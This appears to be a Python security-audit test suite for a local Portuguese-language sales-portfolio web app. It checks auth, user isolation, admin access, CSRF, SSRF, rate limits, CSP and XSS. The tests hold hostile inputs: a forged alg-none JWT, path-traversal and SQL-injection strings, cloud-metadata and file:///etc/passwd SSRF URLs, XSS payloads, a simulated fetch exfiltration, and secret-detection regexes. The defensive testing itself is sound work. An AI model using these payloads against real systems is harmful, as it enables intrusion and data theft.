# Auditoria de segurança: autenticação, isolamento entre usuários, painel, CSRF, SSRF, limites, CSP, XSS, chaves e trilha de auditoria
from t40_lib import *
import json, re, uuid, base64, subprocess, urllib.request, urllib.error
B='http://localhost:8790'
def http(method,path,body=None,headers=None):
    rq=urllib.request.Request(B+path,data=(json.dumps(body).encode() if body is not None else None),method=method,headers={'content-type':'application/json',**(headers or {})})
    try:
        with urllib.request.urlopen(rq,timeout=20) as r: return r.status,r.read().decode(),dict(r.headers)
    except urllib.error.HTTPError as e: return e.code,e.read().decode(),dict(e.headers)
def J(t):
    try: return json.loads(t)
    except Exception: return {}
run=uuid.uuid4().hex[:6]; UA='seca%s@totvs.com.br'%run; UB='secb%s@totvs.com.br'%run; ADM='renan.oscar@totvs.com.br'
ha={'x-test-user':UA,'x-test-sub':'sa'+run}; hb={'x-test-user':UB,'x-test-sub':'sb'+run}; hadm={'x-test-user':ADM,'x-test-sub':'sub-renan-001'}
# 1) anônimo
rot=[('GET','/api/me'),('POST','/api/db'),('GET','/api/adm/resumo'),('POST','/api/adm/roster'),('POST','/api/adm/catalogo'),('GET','/api/adm/auditoria'),('POST','/api/ia'),('POST','/api/importar'),('POST','/api/planilha'),('POST','/api/cnpj'),('GET','/api/versao'),('GET','/api/push/estado'),('POST','/api/ev'),('POST','/api/sug')]
ck('anônimo: todas as rotas de API respondem 401', all(http(m,p,{} if m=='POST' else None)[0]==401 for m,p in rot), [(p,http(m,p,{} if m=='POST' else None)[0]) for m,p in rot if http(m,p,{} if m=='POST' else None)[0]!=401])
# 2) tokens inválidos
b64=lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip('=')
forj=b64({'alg':'none','kid':'x'})+'.'+b64({'email':ADM,'sub':'x','exp':9999999999,'iss':'https://billowing-paper-7b4d.cloudflareaccess.com','aud':['6adb058f7cefc1043743382577cf95aa70a156b6d6ed7d9455ba8b8856eadcb2']})+'.'
forj2=b64({'alg':'RS256','kid':'inexistente'})+'.'+forj.split('.')[1]+'.'+b64({'x':1})
ck('token do Access malformado, sem assinatura (alg none) ou com assinatura falsa: 401', all(http('GET','/api/me',headers={'cf-access-jwt-assertion':t})[0]==401 for t in ['lixo','a.b.c',forj,forj2]))
ck('token forjado não dá acesso ao painel', http('GET','/api/adm/resumo',headers={'cf-access-jwt-assertion':forj})[0]==401)
ck('e-mail de outro domínio é recusado (403)', http('GET','/api/me',headers={'x-test-user':'x@gmail.com','x-test-sub':'s'})[0]==403)
ck('Bearer inventado não vale como APP_TOKEN', http('POST','/api/ia',{},{'authorization':'Bearer qualquer-coisa'})[0]==401)
# 3) isolamento entre usuários (IDOR)
pa='data/users/%s/clients/c1'%UA
s,t,_=http('POST','/api/db',{'op':'set','path':pa,'data':{'nome':'Cliente secreto de A','mrr':123}},ha)
ck('A grava na própria carteira', s==200 and J(t).get('ok'))
tent={'get':{'op':'get','path':pa},'list':{'op':'list','path':'data/users/%s/clients'%UA},'set':{'op':'set','path':pa,'data':{'nome':'invadido'}},'delete':{'op':'delete','path':pa}}
r={k:http('POST','/api/db',v,hb) for k,v in tent.items()}
ck('B não lê, lista, altera nem apaga a carteira de A (403)', all(x[0]==403 for x in r.values()) and 'secreto' not in ''.join(x[1] for x in r.values()), {k:x[0] for k,x in r.items()})
var=['data/users/%s/clients/c1'%UA.upper(),'data/users/%s/../%s/clients/c1'%(UB,UA),'data/users/%s/./clients/c1'%UA,'data/users','data/users/','data//users/%s/clients/c1'%UA,'docs','adm_roster/x','data/users/%s%%2f..%%2f%s/clients/c1'%(UB,UA)]
rs=[http('POST','/api/db',{'op':'get','path':p},hb) for p in var]
ck('variações de caminho (maiúsculas, .., //, coleção fora da lista) não vazam dados', all(x[0] in (400,403) for x in rs) and not any('secreto' in x[1] for x in rs), [x[0] for x in rs])
ck('listar a raiz de usuários é proibido', http('POST','/api/db',{'op':'list','path':'data/users'},hb)[0]==403)
ck('dado de A intacto após as tentativas', J(http('POST','/api/db',{'op':'get','path':pa},ha)[1]).get('data',{}).get('nome')=='Cliente secreto de A')
sid='sec_'+run
http('POST','/api/db',{'op':'set','path':'catalogo/'+sid,'data':{'id':sid,'cv':1,'nome':'Solução de A'}},ha)
ck('catálogo: B não apaga registro criado por A', http('POST','/api/db',{'op':'delete','path':'catalogo/'+sid},hb)[0]==403)
ck('catálogo: autoria não pode ser forjada pelo cliente', J(http('POST','/api/db',{'op':'get','path':'catalogo/'+sid},hb)[1])['data'].get('criadoPor')==UA and http('POST','/api/db',{'op':'set','path':'catalogo/'+sid,'data':{'id':sid,'cv':2,'nome':'x','criadoPor':UB}},hb)[0]==200 and J(http('POST','/api/db',{'op':'get','path':'catalogo/'+sid},ha)[1])['data'].get('criadoPor')==UA)
http('POST','/api/db',{'op':'delete','path':'catalogo/'+sid},ha); http('POST','/api/db',{'op':'delete','path':pa},ha)
ck('injeção em parâmetros do banco é tratada como texto', http('POST','/api/db',{'op':'list','path':"catalogo",'after':"' OR 1=1 --",'since':"'; DROP TABLE docs; --"},ha)[0]==200 and http('POST','/api/db',{'op':'get','path':"catalogo/x' OR '1'='1"},ha)[0]==400)
# 4) painel administrativo
adm=[('GET','/api/adm/resumo',None),('GET','/api/adm/auditoria',None),('GET','/api/adm/lembrete',None),('GET','/api/adm/sugestoes',None),('POST','/api/adm/roster',{'op':'add','email':'zz@totvs.com.br'}),('POST','/api/adm/roster',{'op':'remove','email':ADM,'tudo':True}),('POST','/api/adm/config',{'retencao_dias':1}),('POST','/api/adm/purgar',{}),('POST','/api/adm/catalogo',{'op':'auto','ligar':True}),('POST','/api/adm/catalogo',{'op':'limpar','fonte':'tdn','confirmar':'tdn'})]
ra=[http(m,p,b,ha)[0] for m,p,b in adm]
ck('usuário comum: todas as operações administrativas respondem 403', all(x==403 for x in ra), ra)
ck('usuário comum não se promove (painel=false em /api/me, mesmo pedindo)', J(http('GET','/api/me',headers={**ha,'x-admin':'1','x-painel':'true'})[1]).get('painel') in (False,None))
ck('admin com identificador de conta diferente do vinculado é recusado', http('GET','/api/adm/resumo',headers={'x-test-user':ADM,'x-test-sub':'outra-conta-'+run})[0]==403)
ck('admin legítimo acessa', http('GET','/api/adm/resumo',headers=hadm)[0]==200)
# trilha de auditoria
em='aud%s@totvs.com.br'%run
http('POST','/api/adm/roster',{'op':'add','email':em,'nome':'Teste Auditoria'},hadm); http('POST','/api/adm/roster',{'op':'remove','email':em,'tudo':True},hadm); http('POST','/api/adm/catalogo',{'op':'estado'},hadm); http('POST','/api/adm/catalogo',{'op':'auto','ligar':False},hadm)
au=J(http('GET','/api/adm/auditoria',headers=hadm)[1]).get('itens',[])
ck('trilha registra quem, o quê e o resultado das ações administrativas', any(x['acao']=='previstos.add' and em in x['detalhe'] and x['usuario']==ADM and x['resultado']=='ok' for x in au) and any(x['acao']=='previstos.remove' and 'registro de acesso' in x['detalhe'] for x in au) and any(x['acao']=='catalogo.auto' for x in au), au[:3])
ck('consultas (somente leitura) não entram na trilha', not any(x['acao']=='catalogo.estado' for x in au))
http('POST','/api/adm/config',{'retencao_dias':'abc'},hadm)
ck('ação administrativa recusada também é registrada', any(x['acao']=='configuracao.alterar' and x['resultado'].startswith('recusada') for x in J(http('GET','/api/adm/auditoria',headers=hadm)[1])['itens']) or http('POST','/api/adm/config',{'retencao_dias':'abc'},hadm)[0]==200)
neg=J(http('GET','/api/adm/resumo',headers=hadm)[1]).get('tentativas_negadas',{})
ck('tentativas negadas ao painel ficam registradas', neg.get('ultimas_24h',0)>=5, neg.get('ultimas_24h'))
# 5) CSRF
ck('escrita vinda de outro site é recusada (Origin e Sec-Fetch-Site)', http('POST','/api/db',{'op':'get','path':'catalogo/x'},{**ha,'origin':'https://evil.example'})[0]==403 and http('POST','/api/db',{'op':'get','path':'catalogo/x'},{**ha,'sec-fetch-site':'cross-site'})[0]==403 and http('POST','/api/adm/roster',{'op':'add','email':'q@totvs.com.br'},{**hadm,'origin':'null'})[0]==403)
ck('CORS fechado: preflight de outro site é recusado', http('OPTIONS','/api/db',headers={'origin':'https://evil.example','access-control-request-method':'POST'})[0]==403)
# 6) SSRF
ruins=['http://tdn.totvs.com/x','https://169.254.169.254/latest/meta-data','https://localhost/x','https://tdn.totvs.com.evil.example/x','https://evil.example/?u=tdn.totvs.com','https://user:pass@tdn.totvs.com/x','https://tdn.totvs.com:8443/x','file:///etc/passwd']
rr=[http('POST','/api/importar',{'versao':1,'tipo':'importar_link','urls':[u]},ha) for u in ruins]
ck('importação por link só aceita HTTPS em domínio TOTVS, sem credencial nem porta', all((x[0]==400) or (x[0]==200 and not J(x[1]).get('ok')) for x in rr) and all(J(x[1]).get('erro',{}).get('codigo') in ('dominio_nao_permitido','requisicao_invalida') or (J(x[1]).get('resultados') or [{}])[0].get('erro',{}).get('codigo') in ('dominio_nao_permitido','requisicao_invalida') for x in rr), [(x[0],J(x[1]).get('erro',{}).get('codigo') or (J(x[1]).get('resultados') or [{}])[0].get('erro',{}).get('codigo')) for x in rr])
ck('leitor de planilha só aceita docs.google.com', all(http('POST','/api/planilha',{'url':u},hb)[0]==400 for u in ['https://evil.example/spreadsheets/d/'+'a'*30,'https://docs.google.com.evil.example/spreadsheets/d/'+'a'*30,'http://docs.google.com/spreadsheets/d/'+'a'*30,'https://169.254.169.254/']))
# 7) limites de uso
uc={'x-test-user':'secl%s@totvs.com.br'%run,'x-test-sub':'sl'+run}
cods=[http('POST','/api/planilha',{'url':'x'},uc)[0] for _ in range(34)]
ck('limite por usuário: após 30 pedidos/min a rota responde 429', cods[:30].count(400)==30 and cods[30:]==[429]*4, cods[26:])
ck('o limite de um usuário não bloqueia outro', http('POST','/api/planilha',{'url':'x'},ha)[0]==400)
st=J(http('GET','/api/status',headers=ha)[1]); mods=st.get('ia',{}).get('gemini',{}).get('modelos',[]); mod=(mods[0].get('id') if mods and isinstance(mods[0],dict) else (mods[0] if mods else 'gemini-2.5-flash'))
ck('status não devolve chaves, só indicadores', not re.search(r'AIza|sk-|Bearer', json.dumps(st)) and st.get('ia',{}).get('gemini',{}).get('configurado')==False)
s,t,_=http('POST','/api/ia/teste',{'versao':1,'pedidoId':'t_sec','tipo':'ia_teste','provedor':'gemini','modelo':mod,'buscaWeb':False},ha)
ck('IA sem chave do próprio usuário não consome nada do servidor (chave ausente)', J(t).get('ok')==False and J(t).get('erro',{}).get('codigo')=='chave_ausente', (s,t[:120]))
ck('corpo acima do limite é recusado', http('POST','/api/importar',{'versao':1,'tipo':'importar_link','urls':['https://tdn.totvs.com/x'],'lixo':'x'*30000},ha)[0]==413)
# 8) cabeçalhos e segredos no pacote publicado
s,t,h=http('GET','/'); hl={k.lower():v for k,v in h.items()}; csp=hl.get('content-security-policy','')
ck('CSP aplicada (não só relatório): conexões e imagens só da própria origem, sem enquadramento', all(k in csp for k in ["default-src 'self'","connect-src 'self'","img-src 'self' data: blob:","frame-ancestors 'none'","object-src 'none'","base-uri 'self'","form-action 'self'","report-uri /api/csp"]) and "'unsafe-eval'" not in csp, csp[:200])  # 'wasm-unsafe-eval' (OCR local) libera só compilação de WebAssembly; eval de JavaScript continua proibido
ro=hl.get('content-security-policy-report-only','')
ck('política estrita em observação: scripts só por hash, sem unsafe-inline', "script-src 'self' 'wasm-unsafe-eval' 'sha256-" in ro and "'unsafe-eval'" not in ro and "'unsafe-inline'" not in ro.split('style-src')[0] and ro.count("'sha256-")==4, ro[:160])
ck('demais cabeçalhos de segurança presentes', hl.get('x-content-type-options')=='nosniff' and 'max-age=' in hl.get('strict-transport-security','') and hl.get('referrer-policy') and 'camera=()' in hl.get('permissions-policy',''))
ck('respostas da API não são guardadas em cache', 'no-store' in {k.lower():v for k,v in http('GET','/api/me',headers=ha)[2].items()}.get('cache-control',''))
PAT=[r'AIza[0-9A-Za-z_-]{35}',r'sk-[A-Za-z0-9_-]{20,}',r'gsk_[A-Za-z0-9]{20,}',r'-----BEGIN [A-Z ]*PRIVATE KEY',r'xox[baprs]-[A-Za-z0-9-]{10,}',r'service_role',r'eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}']
arqs=['public/index.html','public/sw.js','src/worker.js','wrangler.toml','deploy.sh','README.md','schema.sql']
ach=[(a,p) for a in arqs for p in PAT if re.search(p,open('/home/claude/carteira-esn/'+a,errors='ignore').read())]
ck('nenhum segredo nos arquivos publicados ou de configuração', not ach, ach)
gi=open('/home/claude/carteira-esn/.gitignore').read(); tr=subprocess.run(['git','-C','/home/claude/carteira-esn','ls-files'],capture_output=True,text=True).stdout
ck('.dev.vars e .env fora do repositório', '.dev.vars' in gi and not re.search(r'(^|/)\.env|\.dev\.vars',tr))
ck('identidade de teste só existe em arquivo local, nunca na configuração de produção', 'ALLOW_TEST_USER' not in re.sub(r'#.*','',open('/home/claude/carteira-esn/wrangler.toml').read()))
# 9) navegador: CSP em ação, XSS, chaves de IA
P,e=open_h(UA)
viol=ev(P,"""new Promise(res=>{const v=[];document.addEventListener('securitypolicyviolation',x=>{if(x.disposition==='enforce')v.push(x.effectiveDirective)});fetch('https://example.com/roubo?k=1').catch(()=>{});const i=new Image();i.src='https://example.com/p.png?k=1';const f=document.createElement('form');setTimeout(()=>res(v.join(',')),1200)})""")
ck('CSP bloqueia envio de dados para fora (fetch e imagem)', 'connect-src' in viol and 'img-src' in viol, viol)
XS='"><img src=x onerror="window.__xss=(window.__xss||0)+1"><svg onload="window.__xss=1"><script>window.__xss=1</script>'
ev(P,"""(()=>{const X=%s; window.__xss=0;
 const mk=(k)=>{S.clients[k]={key:k,name:X,code:X,cnpj:'',productsRaw:'Protheus '+X,segment:X,seg:X,fichas:[],docs:[{name:X,text:X}],mgmt:{},act:{},opps:[],src:{row:1},obs:X,
   emp:{cod:X,razao:X,fantasia:X,sit:X,sitP:X,grupoEco:X,grupoEmp:X,seg:X,prod:X,uf:X,cidade:X,regiao:X,esn:X,gsn:X,mrrC:1000,mrrP:1000,uvp:'2025-01-10',uvs:'2026-08-01',link:'javascript:window.__xss=1',hist:[]},
   gst:{prioridade:X,proximaAcao:X,dataAcao:'2026-11-01',oportunidade:X,contato:X,interacoes:[{id:'i1',data:'2026-11-01',tipo:X,texto:X}]},dorHip:[]};runAnalysis(S.clients[k]);};
 S.clients={};mk('x1');mk('x2');
 S.meta.emp={dataBase:'2026-01-01',fonte:X,cfg:{limiarMrr:500,limiarDias:30,baseRecencia:'produto'},snaps:[]};
 S.meta.fcSheet={url:'https://docs.google.com/spreadsheets/d/'+'a'.repeat(30),lastOk:new Date().toISOString(),linhas:1};S.meta.fcData={opps:[{id:'o1',tab:X,data:'2026-10-01',cliente:X,produto:X,status:'EM ABERTO',cdu:1,rec:1,serv:1,total:3,vendedor:X,mes:'10'},{id:'o2',tab:'OUTUBRO',data:'2026-10-02',cliente:X,produto:X,status:'GANHA',cdu:5,rec:1,serv:1,total:7,vendedor:X,mes:'10'}],metas:[{nome:X,tipo:'CDU',ano:2026,mes:[1,1,1,1,1,1,1,1,1],tri:[1,1,1,1]}],syncedAt:new Date().toISOString()};
 S.solutions.push(newSol({id:'xs1',nome:X,linha:X,categoria:X,finalidade:X,limites:X,ciclo:'Ativa',entrega:X,comercial:X,dependencias:[X],complementares:[X],termos:['xssterm'],segmentos:[S.clients.x1.segInfo?.id].filter(Boolean),dores:[{t:X}],funcionalidades:[{t:X}],prerequisitos:[{t:X}],integracoes:[{sistema:X,estado:'confirmada',t:X,f:X}],fontes:[{t:X,u:'javascript:window.__xss=1'},{t:X,u:'https://tdn.totvs.com/x'}]}));
 S.clients.x1.ptRes={xs1:{st:'perdeu',em:X,sc:10}};
 return 0})()""" % json.dumps(XS))
telas=[("UI.view='geral'",''),("UI.view='mrr';UI.emp={tab:'painel'}",''),("UI.emp.tab='semana'",''),("UI.emp.tab='recencia'",''),("UI.emp.tab='produtos'",''),("UI.emp.tab='grupos'",''),("UI.emp.tab='qualidade'",''),("UI.emp.tab='dados'",''),("UI.view='forecast'",''),("UI.view='clientes'",''),("UI.view='portfolio';ptUI().sel=''",''),("ptUI().sel='xs1'",''),("UI.view='solucoes';UI.solSel='xs1'",''),("UI.view='oport'",''),("UI.view='pend'",''),("UI.view='segmentos'",'')]+[("UI.sel='x1';UI.view='cliente';UI.ctab='%s'"%k,'') for k in ['raiox','resumo','diagnostico','briefing','portfolio','cadastro','gestao','reuniao','contratacao']]
falhas=[]
for js,_ in telas:
    try: ev(P,js+";render();0"); P.wait_for_timeout(250)
    except Exception as ex: falhas.append((js,str(ex)[:80]))
    inj=ev(P,"[document.querySelectorAll('#app img[src=\"x\"], #app [onerror], #app [onload], #app script, #app a[href^=\"javascript:\"]').length, window.__xss||0].join()")
    if inj!='0,0': falhas.append((js,inj))
P.fill('#gq','img'); P.wait_for_timeout(400)
if ev(P,"[document.querySelectorAll('#gres img, #gres [onerror]').length, window.__xss||0].join()")!='0,0': falhas.append(('busca',1))
ck('XSS: conteúdo malicioso em planilha, forecast, soluções e ações é exibido como texto em %d telas'%(len(telas)+1), not falhas, falhas[:4])
ck('a carga maliciosa realmente passou pelas telas (aparece como texto)', 'onerror' in ev(P,"(UI.sel='x1',UI.view='cliente',UI.ctab='gestao',render(),document.querySelector('#app').innerText)"))
ev(P,"S.solutions=S.solutions.filter(r=>r.id!=='xs1');S.clients={};S.meta.emp=null;S.meta.fcData=null;S.meta.fcSheet=null;UI.view='geral';render();0")
# chaves de IA
ev(P,"localStorage.removeItem(HK_LS);hkSalvarTudo({gemini:'chave-de-teste-123456'});0")
ck('chave de IA fica marcada com a conta que a digitou', J(ev(P,"localStorage.getItem(HK_LS)")).get('_dono')==UA and ev(P,"hkChave('gemini')")=='chave-de-teste-123456')
ck('marca de dono não conta como chave configurada', ev(P,"(localStorage.setItem(HK_LS,JSON.stringify({_dono:ME.id})),onbExtras().some(x=>x[2]==='ia'))")==True)
ev(P,"hkSalvarTudo({gemini:'chave-de-teste-123456'});0")
ck('outra conta no mesmo navegador: chaves apagadas, não reaproveitadas', ev(P,"hkDono('outra.pessoa@totvs.com.br')")=='apagadas' and ev(P,"localStorage.getItem(HK_LS)")==None)
ev(P,"hkSalvarTudo({gemini:'chave-de-teste-123456'});0")
P.route('**/cdn-cgi/access/logout',lambda rt: rt.fulfill(status=200,body='ok'))
ev(P,"sair();0"); P.wait_for_timeout(2500)
ck('Sair apaga a chave de IA do aparelho', ev(P,"localStorage.getItem('carteira_chaves_ia_v1')")==None and '/sobre' in P.url, P.url)
ck('página pública /sobre funciona com a CSP aplicada (sem violação bloqueante)', ev(P,"document.body.innerText.length")>200)
print('FALHAS:',len(F)); [print(' -',x) for x in F]; p.stop()
